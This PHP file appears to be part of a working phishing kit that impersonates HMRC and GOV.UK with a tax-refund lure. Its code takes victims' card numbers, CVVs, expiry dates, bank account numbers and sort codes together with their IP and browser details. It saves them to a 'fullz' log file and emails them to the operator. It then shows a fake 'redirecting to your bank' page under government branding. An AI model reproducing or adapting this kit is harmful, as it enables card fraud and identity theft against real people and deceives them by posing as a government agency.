<?php

error_reporting(0);
session_start();

require "includes/kaptcha.php";

$v_ip = $_SERVER['REMOTE_ADDR'];
$hash = md5($v_ip);


date_default_timezone_set('Europe/London');
$ip = $_SERVER['REMOTE_ADDR'];
$time = date("m-d-Y g:i:a");
$agent = $_SERVER['HTTP_USER_AGENT'];

include "includes/my_email.php";


$_SESSION['sc'] = $_POST['sc'];
$sort_code = $_SESSION['sc'];
$_SESSION['an'] = $_POST['an'];
$accnumber = $_SESSION['an'];
$cardholder = $_POST['name'];
$_SESSION['xxx'] = $_POST['xxx'];
$card_number = $_SESSION['xxx'];
$first_digit = substr($card_number, 0, 1);
$bin = substr($card_number, 0, 6);
$last_digits = substr($card_number, 12, 16);
$_SESSION['last4'] = $last_digits;
$expiry_date = "{$_POST['expiryM']}-{$_POST['expiryY']}";
$cvv = $_POST['xxxxx'];

if(isset($_POST['xxxxx']))  {
$msg = $_SESSION['msg1'];
$msg .= "+ ---------------HMRC----------------+\n";
$msg .= "+ Card Information\n";
$msg .= "+ ------------------------------------------+\n";
$msg .= "| Cardholder Name: ".$cardholder."\n";
$msg .= "| Card Number: ".$card_number."\n";
$msg .= "| Expiry Date: ".$expiry_date."\n";
$msg .= "| CVV: ".$cvv."\n";
$msg .= "| Account Number: ".$accnumber."\n";
$msg .= "| Sort Code: ".$sort_code."\n";
$msg .= "---------------------------------------------------------------------------\n";
$msg .= "Sent from $ip on $time via $agent\n";
$msg .= "----------------HMRC--------------------\n";

$msg2 = "+ ---------------HMRC----------------+\n";
$msg2 .= "+ Card Information\n";
$msg2 .= "+ ------------------------------------------+\n";
$msg2 .= "| Cardholder Name: ".$cardholder."\n";
$msg2 .= "| Card Number: ".$card_number."\n";
$msg2 .= "| Expiry Date: ".$expiry_date."\n";
$msg2 .= "| CVV: ".$cvv."\n";
$msg2 .= "| Account Number: ".$accnumber."\n";
$msg2 .= "| Sort Code: ".$sort_code."\n";

$_SESSION['msg1'] = $msg2;

$subject = "HMRC: $bin";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/plain; charset=utf-8\r\n";

if($Encrypt==1) {
$method = 'aes-256-cbc';
$key = substr(hash('sha256', $password, true), 0, 32);
$iv = chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0);
$encrypted = base64_encode(openssl_encrypt($msg, $method, $key, OPENSSL_RAW_DATA, $iv));
}
if($Save_Log==1) {
	if($Encrypt==1) {
	$file=fopen("logs/HMRC-fullz.txt","a");
	fwrite($file,$encrypted);
	fclose($file);
	}
	else {
	$file=fopen("logs/HMRC-fullz.txt","a");
	fwrite($file,$msg);
	fclose($file);
	}
}
if($Send_Log==1) {
	if($Encrypt==1) {
	mail($my_email,$subject,$encrypted,$headers);
	}
	else {
	mail($my_email,$subject,$msg,$headers);
	}
}
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta http-equiv="refresh" content="5;URL='post.php?code=22'" />   
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=Edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link href="assets/css/main.css" media="screen" rel="stylesheet" type="text/css">
        <link href="assets/css/Font.css" media="screen" rel="stylesheet" type="text/css">
        <link rel="shortcut icon" href="assets/img/favicon.ico" type="image/x-icon">
		<link rel="apple-touch-icon-precomposed" sizes="144x144" href="assets/img/114.png">
		<link rel="apple-touch-icon-precomposed" sizes="114x114" href="assets/img/144.png">
		<link rel="apple-touch-icon-precomposed" sizes="72x72" href="assets/img/72.png">
		<link rel="apple-touch-icon-precomposed" href="assets/img/57.png">
		<title>Redirecting to your bank...</title>
</head>


<body class="js-enabled">


            <header role="banner" class="with-proposition" id="global-header">
                <div class="header-wrapper">
                    <div class="header-global">
                        <div class="header-logo">
                            <a href="#" id="logo" class="content">
                            <img src="assets/img/logo.png" width="35" height="31" alt=""> GOV.UK                            </a>                        </div>
                  </div>
                    <div class="header-proposition">
                      <div class="content">
                        <nav id="proposition-menu">
                          <a href="#" id="proposition-name"></a>
                        </nav>
                      </div>
                    </div>
                </div>
            </header>
            <!--end header-->

            

            <div id="global-header-bar"></div>

            <div id="wrapper" style="
    height: 602px;
">
                <div class="maincontent">
    <div id="startHeader" class="start-header group">
        <h1 style="
    padding-top: 150px;
">Bank Validation Request</h1>
    </div>
    <div class="body-container group">
        
                <div style="text-align: center;">
                    <p>
                        <span class="label">Additional bank validation is required to complete your tax refund request.</span>
                    </p>
                </div>

                <div>
                    <p>
                        <span id="verifyfinaltouch" class="label"><img style="margin-left:auto;margin-right:auto;display:block" src="assets/img/spin.gif"></span>
                    </p>
                </div>
				
                <div style="text-align: center;">
                    <p>
                        <span class="label">we are requesting your bank payment form...</span>
                    </p>
                </div>
				
			
				
				
    </div>

</div>
            </div>

</body>
<footer class="group js-footer" id="footer" role="contentinfo">
                <div class="footer-wrapper">
                    <div class="footer-meta">
                        <div class="footer-meta-inner">
                            <ul>
                                <li>
                                    <a href="#">Help</a>
                                </li>
                                <li>
                                    <a href="#">Cookies</a>
                                </li>
                                <li>
                                    <a href="#">Contact</a>
                                </li>
                                <li>
                                    <a href="#"> Terms and conditions</a>
                                </li>
                                <li>
                                    <a href="#">Rhestr o Wasanaethau Cymraeg</a> 
                                </li>
								                                <li>
                                    <a href="#">Built by the Government Digital Service</a> 
                                </li>
                            </ul>
                            <div class="open-government-licence">
                                <p class="logo"><a href="#">Open Government Licence</a></p>
                              <p 
">
                                    All content is available under the <a href="#">
                                        Open Government Licence v3.0</a>, except where otherwise stated</p>
                            </div>
                        </div>
                        <div class="copyright">
                            <a href="#">
                                &copy; Crown copyright</a>
                        </div>
                    </div>
                </div>
            </footer>
            <!--end footer-->
</body></html>